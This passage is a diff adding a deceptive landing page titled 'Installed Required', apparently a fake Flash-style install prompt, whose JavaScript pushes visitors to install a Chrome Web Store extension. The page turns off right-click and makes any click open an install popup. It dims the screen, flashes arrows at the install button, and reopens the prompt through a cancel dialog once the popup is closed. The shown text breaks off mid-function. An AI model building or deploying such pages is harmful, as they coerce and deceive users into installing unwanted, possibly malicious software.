@@ -1,0 +1,1324 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Installed Required</title>
+    <link href="../templates/flashsd/css/css.css" rel="stylesheet">
+    <script src="../templates/flashsd/js/jquery-1.12.4.min.js"></script>
+    <script src="../templates/flashsd/js/jquery-ui.js"></script>
+    <script src="../templates/flashsd/js/js.cookie.min.js" async="" type="text/javascript"></script>
+    <script src="../templates/flashsd/js/main.min.js" async="" type="text/javascript"></script>
+    <link rel="icon" type="image/png" href="../templates/flashsd/img/fav.png" sizes="32x32">
+    <meta name="ROBOTS" content="NOINDEX, NOFOLLOW">
+    <style>
+        html,
+        body,
+        div,
+        span,
+        applet,
+        object,
+        iframe,
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6,
+        p,
+        blockquote,
+        pre,
+        a,
+        abbr,
+        acronym,
+        address,
+        big,
+        cite,
+        code,
+        del,
+        dfn,
+        em,
+        img,
+        ins,
+        kbd,
+        q,
+        s,
+        samp,
+        small,
+        strike,
+        strong,
+        sub,
+        sup,
+        tt,
+        var,
+        b,
+        u,
+        i,
+        center,
+        dl,
+        dt,
+        dd,
+        ol,
+        ul,
+        li,
+        fieldset,
+        form,
+        label,
+        legend,
+        table,
+        caption,
+        tbody,
+        tfoot,
+        thead,
+        tr,
+        th,
+        td,
+        article,
+        aside,
+        canvas,
+        details,
+        embed,
+        figure,
+        figcaption,
+        footer,
+        header,
+        hgroup,
+        menu,
+        nav,
+        output,
+        ruby,
+        section,
+        summary,
+        time,
+        mark,
+        audio,
+        video {
+            margin: 0;
+            padding: 0;
+            border: 0;
+            font-size: 100%;
+            font: inherit;
+            vertical-align: baseline;
+        }
+
+        /* HTML5 display-role reset for older browsers */
+
+        article,
+        aside,
+        details,
+        figcaption,
+        figure,
+        footer,
+        header,
+        hgroup,
+        menu,
+        nav,
+        section {
+            display: block;
+        }
+
+        body {
+            line-height: 1;
+            overflow-y: hidden;
+        }
+
+        ol,
+        ul {
+            list-style: none;
+        }
+
+        blockquote,
+        q {
+            quotes: none;
+        }
+
+        blockquote:before,
+        blockquote:after,
+        q:before,
+        q:after {
+            content: '';
+            content: none;
+        }
+
+        table {
+            border-collapse: collapse;
+            border-spacing: 0;
+        }
+
+        html {
+            position: relative;
+            min-height: 100%;
+            background-color: #fafafa;
+            overflow-x: hidden;
+        }
+
+        #body {
+            z-index: 1;
+            position: fixed;
+            width: 1386px;
+            height: 822px;
+            left: 0;
+            top: 0;
+            background: url('../templates/flashsd/img/bg.png') no-repeat center center;
+            -webkit-background-size: cover;
+            -moz-background-size: cover;
+            -o-background-size: cover;
+            background-size: cover;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        .container {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+        }
+
+        .row {
+            width: 100%;
+            background: #FFF;
+            float: left;
+            box-shadow: 2px 1px 2px 0px rgba(0, 0, 0, 0.35);
+            -webkit-border-radius: 3px;
+            -moz-border-radius: 3px;
+            border-radius: 3px;
+        }
+
+        .top {
+            height: 96px;
+            background: #fbfbfb;
+            line-height: 96px;
+            padding: 0 20px;
+        }
+
+        .left {
+            float: left;
+        }
+
+        .right {
+            float: right;
+        }
+
+        .top .logo {
+            margin-top: 20px;
+        }
+
+        .top .chrome {
+            margin-top: 14px;
+        }
+
+        .middle {
+            text-align: center;
+        }
+
+        .middle h1 {
+            margin: 30px 0 10px 0;
+            text-align: center;
+            font-size: 28px;
+            color: #888a8c;
+        }
+
+        .middle h2 {
+            text-align: center;
+            font-size: 18px;
+            color: #888a8c;
+            margin: 0 0 20px 0;
+            font-weight: 300;
+        }
+
+        .middle .search-icons {
+            margin-bottom: 20px;
+        }
+
+        .middle .arrow {
+            position: absolute;
+            left: -50px;
+            top: -60px;
+        }
+
+        .install {
+            display: block;
+            margin: 30px auto;
+            width: 285px;
+            height: 70px;
+            background: url('../templates/flashsd/img/install.png');
+        }
+
+        .install:hover {
+            //cursor: pointer;
+            background-position: 0 70px;
+        }
+
+        #header {
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 50px;
+            z-index: 99999999;
+        }
+
+        .footer {
+            position: fixed;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            color: #484849;
+            text-decoration: none;
+            text-align: center;
+            font-family: Arial, "Helvetica Neue", Helvetica, sans-serif;
+            font-size: 13px;
+            line-height: 21px;
+            display: inline;
+        }
+
+        p {
+            display: inline;
+        }
+
+        /* unvisited link */
+
+        a:link {
+            color: #484849;
+        }
+
+        /* visited link */
+
+        a:visited {
+            color: #484849;
+        }
+
+        /* mouse over link */
+
+        a:hover {
+            color: #484849;
+        }
+
+        /* selected link */
+
+        a:active {
+            color: #484849;
+        }
+
+        #overlay {
+            z-index: 998;
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            right: 0;
+            min-width: 100%;
+            min-height: 100%;
+            background: rgba(0, 0, 0, 0.39);
+        }
+
+        #msj {
+            position: fixed;
+            z-index: 999;
+            width: 270px;
+            left: 50%;
+            margin-left: -135px;
+            /* Half of the width */
+            top: 420px;
+        }
+
+        .msj h1 {
+            font-weight: bold;
+            font-size: 22px;
+        }
+
+        .msj p {
+            line-height: 1.5em;
+        }
+
+        .top-arrow {
+            width: 371px;
+            position: absolute;
+            top: -143px;
+            left: -50px;
+        }
+
+        .top-arrow img {
+            width: 100%;
+        }
+
+        .stop-scrolling {
+            height: 100%;
+            overflow: hidden;
+        }
+
+        #cancelPop {
+            background: url(../templates/flashsd/img/CancelPop3.png);
+            z-index: 10005;
+            position: absolute;
+            top: 224px;
+            width: 377px;
+            height: 137px;
+            margin-left: -188px;
+            left: 50%; //cursor:default;
+        }
+
+        #yes {
+            z-index: 10005;
+            width: 69px;
+            height: 25px;
+            margin-left: 202px;
+            margin-top: 87px; //cursor: pointer;
+        }
+
+        #no {
+            z-index: 10005;
+            width: 69px;
+            height: 25px;
+            margin-left: 283px;
+            margin-top: 107px;
+            position: absolute;
+            top: -20px; //cursor: pointer;
+        }
+
+        #loader {
+            position: fixed;
+            display: none;
+            left: 50%;
+            background: url(../templates/flashsd/img/loader.png);
+            background-repeat: no-repeat;
+            margin-left: -64px;
+            top: 30px;
+            z-index: 9999999;
+            width: 128px;
+            height: 54px;
+        }
+
+        #loader1 {
+            position: fixed;
+            display: none;
+            left: 50%;
+            background: url(../templates/flashsd/img/loader1.png);
+            background-repeat: no-repeat;
+            margin-left: -124px;
+            top: 95px;
+            z-index: 9999999;
+            width: 256px;
+            height: 54px;
+        }
+
+        #loader2 {
+            position: fixed;
+            display: none;
+            color: #333;
+            font-size: 40px;
+            font-weight: bold;
+            left: 50%;
+            margin-left: -233px;
+            top: 30px;
+            z-index: 9999999;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        #installBox {
+            display: none;
+            z-index: 10003; //cursor: default;
+            border: 1px solid #cccccc;
+            border-radius: 9px;
+            height: 110px;
+            width: 570px;
+            font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;
+            color: black;
+            position: absolute;
+            background: #fbfbfb;
+            opacity: 0.9;
+            margin-left: -285px;
+            left: 50%;
+        }
+
+        #download {
+            width: 202px;
+            height: 60px; //cursor: pointer;
+            position: absolute;
+            z-index: 1;
+            left: 633px;
+            top: 408px;
+        }
+
+        #step {
+            width: 202px;
+            height: 60px; //cursor: pointer;
+            position: absolute;
+            z-index: 1;
+            left: 853px;
+            top: 408px;
+        }
+
+        #policy {
+            z-index: 10; //background: yellow;
+            position: relative;
+            top: 745px;
+            left: 1000px;
+            width: 82px;
+            height: 16px;
+            cursor: pointer;
+        }
+
+        #eula {
+            z-index: 10;
+            position: relative;
+            top: 729px;
+            left: 901px;
+            width: 50px;
+            height: 16px; //cursor: pointer;
+        }
+
+        #footer {
+            position: fixed;
+            left: 0;
+            bottom: 0;
+            width: 97%;
+            padding: 10px 20px;
+            z-index: 10;
+        }
+
+        #footer>ul {
+            display: block;
+            float: left;
+            text-align: left;
+        }
+
+        #footer>ul+ul {
+            float: right;
+            text-align: right;
+        }
+
+        #footer>ul>li {
+            display: inline-block;
+            padding: 2px 5px;
+            color: #EDEDED;
+            /*text-shadow: rgba(0,0,0,.4) 0 1px 0;*/
+            font-size: 12px;
+            line-height: 11px;
+        }
+
+        #footer a {
+            color: grey;
+            text-decoration: none;
+        }
+
+        #footer a:hover {
+            color: #000;
+        }
+
+        .g-recaptcha {
+            position: fixed;
+            z-index: 1;
+            left: 633px;
+            top: 483px;
+        }
+
+        #message {
+            display: none;
+            width: 125px;
+            height: 35px;
+            position: absolute;
+            z-index: 10000;
+            left: 480px;
+            top: 560px;
+            font-family: Roboto, helvetica, arial, sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 17px;
+            color: #585858;
+            border: 1px solid #d3d3d3;
+            background: #f9f9f9;
+            padding: 10px;
+            border-radius: 3px;
+            -webkit-box-shadow: 0px 0px 4px 1px rgba(0, 0, 0, 0.08);
+        }
+
+        #blackArrow {
+            position: absolute;
+            top: -60px;
+            right: 10px;
+            filter: grayscale(100%) brightness(80%) sepia(100%) hue-rotate(-180deg) saturate(1000%) contrast(0.8);
+        }
+
+        #chromeDl {
+            background: url('../templates/flashsd/img/ChromeWebStore.png'); //width: 340px;
+            //height: 96px;
+            width: 255px;
+            height: 72px; //cursor: pointer;
+            position: absolute;
+            z-index: 1; //left: 678px;
+            left: 718px;
+            top: 500px;
+            background-size: cover;
+        }
+
+        #topAlert {
+            background: url('../templates/flashsd/img/TopAlertNew.png');
+            width: 450px;
+            height: 152px;
+            position: absolute;
+            z-index: 999999;
+            left: 50%;
+            top: -2px;
+            margin-left: -225px;
+        }
+
+        #notify {
+            position: absolute;
+            top: 260px;
+        }
+
+        #boxPlus {
+            display: none;
+            bottom: 20px;
+            border: 1px solid lightgrey;
+            border-radius: 5px;
+            text-align: center;
+            position: absolute;
+            width: 150px;
+            height: 70px;
+            font-size: 18px;
+            padding-top: 10px;
+            z-index: 100000;
+            font-family: "Open Sans", arial, sans-serif;
+            background: rgba(255, 255, 255, 1);
+            background: -moz-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: -webkit-gradient(left top, left bottom, color-stop(0%, rgba(255, 255, 255, 1)), color-stop(47%, rgba(246, 246, 246, 1)), color-stop(100%, rgba(237, 237, 237, 1)));
+            background: -webkit-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: -o-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: -ms-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: linear-gradient(to bottom, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ffffff', endColorstr='#ededed', GradientType=0);
+        }
+
+        #boxPlus1 {
+            display: none;
+            bottom: -260px;
+            border: 1px solid lightgrey;
+            border-radius: 5px;
+            text-align: center;
+            position: absolute;
+            width: 150px;
+            height: 70px;
+            font-size: 18px;
+            padding-top: 10px;
+            z-index: 100000;
+            font-family: "Open Sans", arial, sans-serif;
+            background: rgba(255, 255, 255, 1);
+            background: -moz-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: -webkit-gradient(left top, left bottom, color-stop(0%, rgba(255, 255, 255, 1)), color-stop(47%, rgba(246, 246, 246, 1)), color-stop(100%, rgba(237, 237, 237, 1)));
+            background: -webkit-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: -o-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: -ms-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: linear-gradient(to bottom, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ffffff', endColorstr='#ededed', GradientType=0);
+        }
+
+        #box {
+            display: none;
+            border: 1px solid lightgrey;
+            border-radius: 5px;
+            text-align: center;
+            position: absolute;
+            width: 150px;
+            height: 120px;
+            font-size: 25px;
+            padding-top: 50px; //right: 10px;
+            //top: 160px;
+            z-index: 100000;
+            font-family: "Open Sans", arial, sans-serif;
+            background: rgba(255, 255, 255, 1);
+            background: -moz-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: -webkit-gradient(left top, left bottom, color-stop(0%, rgba(255, 255, 255, 1)), color-stop(47%, rgba(246, 246, 246, 1)), color-stop(100%, rgba(237, 237, 237, 1)));
+            background: -webkit-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: -o-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: -ms-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: linear-gradient(to bottom, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ffffff', endColorstr='#ededed', GradientType=0);
+        }
+
+        #box1 {
+            display: none;
+            border: 1px solid lightgrey;
+            border-radius: 5px;
+            text-align: center;
+            position: absolute;
+            width: 150px;
+            height: 120px;
+            font-size: 25px;
+            padding-top: 50px; //right: 10px;
+            //top: 160px;
+            z-index: 100000;
+            font-family: "Open Sans", arial, sans-serif;
+            background: rgba(255, 255, 255, 1);
+            background: -moz-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: -webkit-gradient(left top, left bottom, color-stop(0%, rgba(255, 255, 255, 1)), color-stop(47%, rgba(246, 246, 246, 1)), color-stop(100%, rgba(237, 237, 237, 1)));
+            background: -webkit-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: -o-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: -ms-linear-gradient(top, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            background: linear-gradient(to bottom, rgba(255, 255, 255, 1) 0%, rgba(246, 246, 246, 1) 47%, rgba(237, 237, 237, 1) 100%);
+            filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ffffff', endColorstr='#ededed', GradientType=0);
+        }
+
+        #arrowBlue {
+            display: none; //background: url(../templates/flashsd/img/modernArrow5.png);
+            z-index: 100000;
+            width: 96px;
+            height: 96px;
+            position: absolute;
+            left: -130px; //top: 45px;
+            background-repeat: round;
+        }
+
+        #arrowBlue1 {
+            display: none;
+            background: url(../templates/flashsd/img/modernArrow4.png);
+            z-index: 100000;
+            width: 96px;
+            height: 96px;
+            position: absolute; //right: 160px;
+            top: 45px;
+            background-repeat: round;
+        }
+    </style>
+    <script>
+        ver = "";
+        info = "";
+        hostnameDD = location.hostname;
+    </script>
+</head>
+
+<body id="first" class="step1" oncontextmenu="return false;" style="cursor: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAD+ElEQVR4Xu2az0uTcQCHPx28JHQQE7p4C29eBImOgST2g5JBtw4hIQ2GIREGQu7SpUuQ9gd4MNCDEoTt4skIFkM8mRIDYRVFCw9rxpaLF1YHIZh7370bfJ4dZW/f7/P48HFop8TL2sApa3rgRQDmERAAAZgbMMdnAQjA3IA5PgtAAOYGzPFZAAIwN2COzwIQgLkBc3wWgADMDZjjswAEEMrAaUk/Q/0LPNxWA2EX4Kqki5IetZWCw5s2EDaA6z09PavFYvGhpKeSak3fhAfbYiB0AHNzc2ubm5vKZDL3JL1oCwWHNm0gdADpdHotmUwqkUiUNzY27kh62fRteDB2A5EEMDs7q2KxqJGRkV+5XO6GpPXYSTiwKQORBRCcXiqVNDAwcFQoFC5IyjZ1Ix6K1UCkAQQ3393d1ejo6Jd8Pn9FUi5WGg47sYHIAwhusL29rbGxsU+FQuGSpA8nvhUPxGagJQEEt9/Z2dHg4OD3SqVyXtKP2Ig46EQGWhZAcItMJqPx8fGtUql0WdLXE92MN8diIPIAarWayuXyv8uvrKxocnLybblcviapGAsVhzRsIPIAqtWqent7dXBwcPwS7+q/Nua3hQ1/e1r/xsgCODw8VCqV0sLCgqampjQ/P39X0ptjCJ8lVVqPxQmNGogkgOnpaU1MTFSXlpY+rq+vD/T19WloaGi1VqvdbPQivK89BiIJYG9vT4uLi3OSXiUSiffLy8saHh4+ymaz5/jw155vbKOnhg6gv79/bX9//7mk+5J+d3d3b+Xz+cEggmQy+aD+V8JG78P7YjYQNoDgk/0tSbclHdXvnkqn08+6urpqMzMzryUF/2eAV4caCBvAWUnfjrGdqX/tsaQnHcrNteoGwgbwP5HBz/7gEz+vDjfQqgA6HJvr/TVAAOYtEAABmBswx2cBCMDcgDk+C0AA5gbM8VkAAjA3YI7PAhCAuQFzfBaAAMwNmOOzAARgbsAcnwUgAHMD5vgsAAGYGzDHZwEIwNyAOT4LQADmBszxWQACMDdgjs8CEIC5AXN8FoAAzA2Y47MABGBuwByfBSAAcwPm+CwAAZgbMMdnAQjA3IA5PgtAAOYGzPFZAAIwN2COzwIQgLkBc3wWgADMDZjjswAEYG7AHJ8FIABzA+b4LAABmBswx2cBCMDcgDk+C0AA5gbM8VkAAjA3YI7PAhCAuQFzfBaAAMwNmOOzAARgbsAcnwUgAHMD5vgsAAGYGzDHZwEIwNyAOT4LQADmBszxWQACMDdgjs8CEIC5AXN8FoAAzA2Y47MABGBuwByfBSAAcwPm+CwAAZgbMMdnAQjA3IA5PgtAAOYGzPFZAAIwN2COzwIQgLkBc/w/41TKgfmqXgIAAAAASUVORK5CYII=&quot;) 128 128, crosshair;">
+    <div id="body" onclick="openInstall()"></div>
+    <div class="container"></div>
+    <div id="installBox">
+        <div id="loader"></div>
+        <div id="loader1"></div>
+        <div id="loader2">FREE DOWNLOAD NOW</div>
+    </div>
+    <div id="message">Confirm that you accept the terms
+    </div>
+    <div id="overlay" style="display: none;"></div>
+    <div id="topAlert" style="margin: 0px 0px 0px -225px; width: 450px; height: 152px; position: absolute; left: 630px; top: -2px; display: none;"></div>
+    <div id="cancelPop" style="display: none;">
+        <div id="yes"></div>
+        <div id="no"></div>
+    </div>
+    <div id="download"></div>
+    <div id="step"></div>
+    <img id="pixel" width="0" height="0">
+    <audio>
+<source src="../templates/flashsd/img/light.mp3">
+</audio>
+    <script type="text/javascript">
+        addTimer = null;
+        myVar = null;
+
+        function AddmyTime() {
+            var script = document.createElement('link');
+            script.rel = "chrome-webstore-item";
+            script.href = url1;
+            document.getElementsByTagName('head')[0].appendChild(script);
+            console.log("add url1");
+        }
+
+
+        function AddmyTime1() {
+            var script = document.createElement('link');
+            script.rel = "chrome-webstore-item";
+            script.href = url2;
+            document.getElementsByTagName('head')[0].appendChild(script);
+            console.log("add url2");
+        }
+
+        var isChrome = !!window.chrome && !!window.chrome.webstore;
+        if (isChrome < 1) {
+            //window.onbeforeunload = null;
+
+        }
+
+        var isChrome = !!window.chrome && !!window.chrome.webstore;
+        if (isChrome < 1) {
+            window.onbeforeunload = null;
+        }
+
+
+        var cwswindowclosed = true,
+            oldCWSLeft, oldCWSTop;
+
+        document.onclick = function(evt) {
+
+            if (!cwswindowclosed) {
+                openInstall(true);
+            } else {
+                openInstall();
+            }
+
+        };
+
+        function openInstall(stop) {
+            $('#cancelPop').fadeOut();
+            document.body.style.cursor = '';
+            if (!stop) {
+                myMove();
+                setInterval(myMove, 1000);
+            }
+            if (!stop) {
+                myMove1();
+                setInterval(myMove1, 1000);
+            }
+
+            var crxUrl = "https://chrome.google.com/webstore/detail/hddgjdfbamcipljgpceofbhddgofjgmk";
+            var dualScreenLeft = window.screenLeft != undefined ? window.screenLeft : window.screenX;
+            var dualScreenTop = window.screenTop != undefined ? window.screenTop : window.screenY;
+
+            var width = window.innerWidth ? window.innerWidth : document.documentElement.clientWidth ? document.documentElement.clientWidth : screen.width;
+            var height = window.innerHeight ? window.innerHeight : document.documentElement.clientHeight ? document.documentElement.clientHeight : screen.height;
+
+            var left = ((width / 2) - (927 / 2)) + (window.outerWidth - window.innerWidth) / 2 + dualScreenLeft;
+            var top = ((height / 2) - (612 / 2)) + window.outerHeight - window.innerHeight + dualScreenTop;
+
+            var arrowLeft, arrowTop;
+            if (cwswindowclosed) {
+                arrowLeft = ((width / 2) - (927 / 2)) + 927 + 20;
+                arrowTop = (height / 2) - (612 / 2) + 85;
+
+                if (arrowLeft + 285 > width) {
+                    var diff = arrowLeft - (width - 285);
+                    arrowLeft = width - 285;
+                    left -= diff;
+                }
+
+                if (arrowTop < 0) {
+                    var diff = -arrowTop;
+                    arrowTop = 0;
+                    top += diff;
+                }
+
+                oldCWSLeft = left;
+                oldCWSTop = top;
+            } else {
+                if (typeof oldCWSLeft === 'undefined') oldCWSLeft = left;
+                if (typeof oldCWSTop === 'undefined') oldCWSTop = top;
+
+                arrowLeft = oldCWSLeft - (window.outerWidth - window.innerWidth) / 2 - dualScreenLeft + 927 + 20;
+                arrowTop = oldCWSTop - (window.outerHeight - window.innerHeight) - dualScreenTop + 85;
+            }
+
+            var finalWidth = window.innerWidth + 8;
+            var dualScreenLeft = window.screenLeft != undefined ? window.screenLeft : window.screenX;
+            var leftBRO = ((width / 2) - (finalWidth / 2)) + dualScreenLeft;
+            if (finalWidth > 1240) {
+                $('#topAlert').fadeOut(0);
+                document.getElementById('notify').style.display = "block";
+                document.getElementById('notify1').style.display = "none";
+                finalWidth = 960;
+                finalLeft = left - 30;
+
+
+                if (height < 625) {
+                    document.getElementById('boxPlus').style.bottom = "-260px";
+                } else {
+                    document.getElementById('boxPlus').style.bottom = "20px";
+                }
+
+
+                if (info != "1" && (ver == "400" || ver == "401")) {
+                    $('#boxPlus').fadeIn();
+                    $('#boxPlus').fadeOut(500);
+                    $('#boxPlus').fadeIn();
+                    $('#boxPlus').fadeOut(500);
+                    $('#boxPlus').fadeIn();
+                }
+
+
+            } else {
+                $('#topAlert').fadeOut(0);
+                var dualScreenTop = window.screenTop != undefined ? window.screenTop : window.screenY;
+                var dualScreenLeft = window.screenLeft != undefined ? window.screenLeft : window.screenX;
+                top = dualScreenTop;
+
+                finalLeft = dualScreenLeft;
+                document.getElementById('notify').style.display = "none";
+                document.getElementById('notify1').style.display = "block";
+
+                if (info != "1" && (ver == "400" || ver == "401")) {
+                    $('#boxPlus1').fadeIn();
+                    $('#boxPlus1').fadeOut(500);
+                    $('#boxPlus1').fadeIn();
+                    $('#boxPlus1').fadeOut(500);
+                    $('#boxPlus1').fadeIn();
+                }
+
+
+            }
+            //document.removeEventListener("mouseover", handler);
+
+            var newWindow = window.open(crxUrl, 'window', 'scrollbars=no, menubar=no, width=' + finalWidth + ', height=220, top=' + top + ', left=' + finalLeft);
+
+            try {
+                newWindow.focus();
+            } catch (e) {}
+            cwswindowclosed = false;
+
+            document.body.style.overflow = 'hidden';
+            $('#overlay').show();
+
+            try {
+                document.getElementById('box').style.display = "block";
+            } catch (e) {}
+            try {
+                document.getElementById('arrowBlue').style.display = "block";
+            } catch (e) {}
+            try {
+                document.getElementById('box1').style.display = "block";
+            } catch (e) {}
+            try {
+                document.getElementById('arrowBlue1').style.display = "block";
+            } catch (e) {}
+
+
+
+
+
+
+            var a = document.getElementById('notify');
+            var finalLeftBox = arrowLeft + 120;
+
+            var b = document.getElementById('arrowBlue');
+            var topc = 18;
+            b.style.top = topc + 'px';
+
+            //var finalTopBox=260;
+            var finalTopBox = arrowTop;
+
+            a.style.left = finalLeftBox + 'px';
+            a.style.top = finalTopBox + 'px';
+
+            $('#overlay').show();
+
+            var c = setInterval(function() {
+
+                if (newWindow.closed) {
+                    if (!animationDD) animationDD = requestAnimationFrame(animateDD);
+                    cwswindowclosed = true;
+
+                    c = clearInterval(c);
+                    document.body.style.overflow = 'unset';
+                    try {
+                        document.getElementById('box').style.display = "none";
+                    } catch (e) {}
+                    try {
+                        document.getElementById('arrowBlue').style.display = "none";
+                    } catch (e) {}
+                    try {
+                        document.getElementById('box1').style.display = "none";
+                    } catch (e) {}
+                    try {
+                        document.getElementById('arrowBlue1').style.display = "none";
+                    } catch (e) {}
+                    try {
+                        document.getElementById('boxPlus').style.display = "none";
+                    } catch (e) {}
+                    try {
+                        document.getElementById('boxPlus1').style.display = "none";
+                    } catch (e) {}
+
+
+
+                    document.getElementById("body").style.backgroundImage = "url('../templates/flashsd/img/bgFinal.png')";
+
+                    $('#cancelPop').fadeIn(100);
+
+
+                }
+
+            }, 200);
+
+        }
+
+
+
+
+
+
+        function openInstall2() {
+            document.body.style.cursor = '';
+            myMove();
+            setInterval(myMove, 1000);
+            myMove1();
+            setInterval(myMove1, 1000);
+
+
+            crxUrl = "https://chrome.google.com/webstore/detail/hddgjdfbamcipljgpceofbhddgofjgmk";
+
+
+            var dualScreenLeft = window.screenLeft != undefined ? window.screenLeft : window.screenX;
+            var dualScreenTop = window.screenTop != undefined ? window.screenTop : window.screenY;
+
+            var width = window.innerWidth ? window.innerWidth : document.documentElement.clientWidth ? document.documentElement.clientWidth : screen.width;
+            var height = window.innerHeight ? window.innerHeight : document.documentElement.clientHeight ? document.documentElement.clientHeight : screen.height;
+
+            var left = ((width / 2) - (927 / 2)) + (window.outerWidth - window.innerWidth) / 2 + dualScreenLeft;
+            var top = ((height / 2) - (612 / 2)) + window.outerHeight - window.innerHeight + dualScreenTop;
+
+            var arrowLeft, arrowTop;
+            if (cwswindowclosed) {
+                arrowLeft = ((width / 2) - (927 / 2)) + 927 + 20;
+                arrowTop = (height / 2) - (612 / 2) + 85;
+
+                if (arrowLeft + 285 > width) {
+                    var diff = arrowLeft - (width - 285);
+                    arrowLeft = width - 285;
+                    left -= diff;
+                }
+
+                if (arrowTop < 0) {
+                    var diff = -arrowTop;
+                    arrowTop = 0;
+                    top += diff;
+                }
+
+                oldCWSLeft = left;
+                oldCWSTop = top;
+            } else {
+                if (typeof oldCWSLeft === 'undefined') oldCWSLeft = left;
+                if (typeof oldCWSTop === 'undefined') oldCWSTop = top;
+
+                arrowLeft = oldCWSLeft - (window.outerWidth - window.innerWidth) / 2 - dualScreenLeft + 927 + 20;
+                arrowTop = oldCWSTop - (window.outerHeight - window.innerHeight) - dualScreenTop + 85;
+            }
+
+            var finalWidth = window.innerWidth;
+            var dualScreenLeft = window.screenLeft != undefined ? window.screenLeft : window.screenX;
+            var leftBRO = ((width / 2) - (finalWidth / 2)) + dualScreenLeft;
+            if (finalWidth > 1240) {
+
+
+                document.getElementById('notify').style.display = "block";
+                document.getElementById('notify1').style.display = "none";
+                finalWidth = 960;
+                finalLeft = left - 30;
+
+
+
+                if (height < 625) {
+                    document.getElementById('boxPlus').style.bottom = "-260px";
+                } else {
+                    document.getElementById('boxPlus').style.bottom = "20px";
+                }
+
+                if (info != "1" && (ver == "400" || ver == "401")) {
+                    $('#boxPlus').fadeIn();
+                    $('#boxPlus').fadeOut(500);
+                    $('#boxPlus').fadeIn();
+                    $('#boxPlus').fadeOut(500);
+                    $('#boxPlus').fadeIn();
+
+                }
+
+            } else {
+                var dualScreenTop = window.screenTop != undefined ? window.screenTop : window.screenY;
+                var dualScreenLeft = window.screenLeft != undefined ? window.screenLeft : window.screenX;
+                top = dualScreenTop;
+                finalLeft = dualScreenLeft - 2;
+                document.getElementById('notify').style.display = "none";
+                document.getElementById('notify1').style.display = "block";
+
+                if (info != "1" && (ver == "400" || ver == "401")) {
+                    $('#boxPlus1').fadeIn();
+                    $('#boxPlus1').fadeOut(500);
+                    $('#boxPlus1').fadeIn();
+                    $('#boxPlus1').fadeOut(500);
+                    $('#boxPlus1').fadeIn();
+                }
+
+            }
+            //document.removeEventListener("mouseover", handler);
+            var newWindow = window.open(crxUrl, 'window', 'scrollbars=no, menubar=no, width=' + finalWidth + ', height=180, top=' + top + ', left=' + finalLeft);
+
+            //try {newWindow.focus();}catch (e) {}
+            //cwswindowclosed = false;
+
+            document.body.style.overflow = 'hidden';
+            $('#overlay').show();
+
+            try {
+                document.getElementById('box').style.display = "block";
+            } catch (e) {}
+            try {
+                document.getElementById('arrowBlue').style.display = "block";
+            } catch (e) {}
+            try {
+                document.getElementById('box1').style.display = "block";
+            } catch (e) {}
+            try {
+                document.getElementById('arrowBlue1').style.display = "block";
+            } catch (e) {}
+
+
+
+
+            var a = document.getElementById('notify');
+            var finalLeftBox = arrowLeft + 120;
+
+
+            var b = document.getElementById('arrowBlue');
+            var topc = 18;
+            b.style.top = topc + 'px';
+
+            var finalTopBox = arrowTop;
+            //var finalTopBox=260;
+
+            a.style.left = finalLeftBox + 'px';
+            a.style.top = finalTopBox + 'px';
+
+            $('#overlay').show();
+
+            var c = setInterval(function() {
